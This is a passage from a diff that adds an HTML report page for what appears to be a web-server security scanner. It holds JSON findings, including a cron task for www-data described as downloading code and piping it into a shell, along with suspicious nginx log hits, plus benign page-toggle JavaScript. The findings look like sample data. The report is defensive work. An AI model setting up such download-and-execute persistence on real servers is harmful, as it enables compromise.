total)","path":"/var/log/nginx/shop.access.log"},{"time":"2026-10-21T16:09:30Z","kind":"persistence","severity":"high","summary":"Suspicious scheduled task (downloads and pipes into a shell)","path":"/var/spool/cron/crontabs/www-data"},{"time":"2026-10-22T02:09:41Z","kind":"log","severity":"high","summary":"Requests to a flagged file — last seen","path":"/var/log/nginx/shop.access.log"}],"stats":{"files_scanned":9,"php_files":7,"bytes_scanned":905,"log_files":2,"log_lines":9,"recent_php_changes":7}}}</script>
+<script>(function () {
+  "use strict";
+  var root = document.documentElement;
+  function store(k, v) { try { if (v === undefined) return localStorage.getItem(k); localStorage.setItem(k, v); } catch (e) { return null; } }
+
+  function setLang(l) {
+    root.setAttribute("data-lang", l);
+    root.setAttribute("lang", l === "zh" ? "zh-CN" : "en");
+    document.querySelectorAll("[data-set-lang]").forEach(function (b) { b.setAttribute("aria-pressed", String(b.getAttribute("data-set-lang") === l)); });
+  }
+  var initial = root.getAttribute("data-initial-lang");
+  var saved = store("bastion-lang");
+  if (initial === "auto") initial = saved || ((navigator.language || "").toLowerCase().indexOf("zh") === 0 ? "zh" : "en");
+  setLang(initial);
+
+  function setTheme(t) {
+    if (t) root.setAttribute("data-theme", t); else root.removeAttribute("data-theme");
+    var cur = t || (matchMedia("(prefers-color-scheme: light)").matches ? "light" : "dark");
+    document.querySelectorAll("[data-set-theme]").forEach(function (b) { b.setAttribute("aria-pressed", String(b.getAttribute("data-set-theme") === cur)); });
+  }
+  setTheme(store("bastion-theme"));
+
+  document.addEventListener("click", function (e) {
+    var t = e.target.closest("button");
+    if (!t) return;
+    if (t.hasAttribute("data-set-lang")) { var l = t.getAttribute("data-set-lang"); setLang(l); store("bastion-lang", l); }
+    if (t.hasAttribute("data-set-theme")) { var th = t.getAttribute("data-set-theme"); setTheme(th); store("bastion-theme", th); }
+    if (t.hasAttribute("data-print")) { document.querySelectorAll("details").forEach(function (d) { d.open = true; }); window.print(); }
+    if (t.hasAttribute("data-filter")) {
+      var f = t.getAttribute("data-filter");
+      document.querySelectorAll("[data-filter]").forEach(function (b) { b.setAttribute("aria-pressed", String(b === t)); });
+      document.querySelectorAll(".r-inst").forEach(function (row) {
+        var s = row.getAttribute("data-status");
+        row.hidden = f === "attention" ? s === "fixed" : f === "fixed" ? s !== "fixed" : false;
+      });
+    }
+  });
+})();
+</script>
+</body>
+</html>
